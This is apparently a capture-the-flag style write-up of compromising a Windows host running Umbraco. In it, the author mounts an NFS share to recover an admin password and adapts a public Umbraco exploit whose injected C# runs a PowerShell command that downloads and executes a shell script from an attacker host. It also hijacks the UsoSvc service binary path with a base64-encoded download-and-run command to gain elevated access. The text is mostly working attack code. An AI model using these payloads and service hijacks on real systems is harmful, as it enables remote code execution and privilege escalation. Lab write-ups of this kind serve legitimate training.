@@ -1,0 +1,45 @@
+we found none of the port s are working except the ==nfs== port
+
+so we cloned it in tmp and loked in Umbraco file
+
+we ==greped== admin@htb.local and got the password
+
+we found the version of the Umbraco is same as given in ==searchsploit==
+
+so we modified the code to -
+
+```
+<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
+{ string cmd = ""; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
+ proc.StartInfo.FileName = "calc.exe"; proc.StartInfo.Arguments = cmd;\
+ proc.StartInfo.UseShellExecute = false;
+```
+
+```
+<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
+{ string cmd = "IEX(IWR http://10.10.14.9/shell.ps1 -UseBasicParsing)"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
+ proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd;\
+ proc.StartInfo.UseShellExecute = false;
+```
+
+cmd and file name is changed
+
+and we executed to get a shell.
+
+we found winpeas said ==Modify service binary path==
+
+so we `sc.exe config UsoSvc binpath="powershell.exe IWR http://10.10.14.9:5555/shell.ps1 -UseBasicParsing"`
+
+just to get a shell by chnaging the bin path
+
+but it didnot work
+
+so we encoded it
+
+`echo "IEX( IWR http://10.10.14.9:5555/shell.ps1 -UseBasicParsing )" | iconv -t utf-16le | base64 -w 0`
+
+`and then `
+
+`sc.exe config UsoSvc binpath="cmd.exe /c powershell.exe -EncodedCommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA5ADoANQA1ADUANQAvAHMAaABlAGwAbAAuAHAAcwAxACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgACkACgA="`
+
+we  did sc.exe start UsoSvc and ==stop== and got shell
